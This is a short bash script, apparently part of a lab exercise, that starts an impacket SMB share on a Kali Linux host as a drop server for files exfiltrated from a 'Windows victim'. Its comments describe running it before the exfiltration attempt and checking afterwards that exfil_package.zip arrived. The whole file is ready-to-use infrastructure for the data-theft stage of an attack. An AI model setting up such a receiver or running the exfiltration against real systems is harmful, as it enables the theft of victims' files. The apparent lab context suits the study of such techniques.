#!/bin/bash
# Set up the SMB drop server on Kali Linux (192.168.57.10)
# Run this before the exfiltration attempt from the Windows victim

mkdir -p /home/kali/share

# Start the impacket SMB server
# Needs sudo because it binds port 445
sudo impacket-smbserver smb_share /home/kali/share -smb2support -username kali -password kali

# Leave this running. It prints every connection and file write.
# After the attack, confirm the file arrived:
#   ls -la /home/kali/share
#   unzip -l /home/kali/share/exfil_package.zip
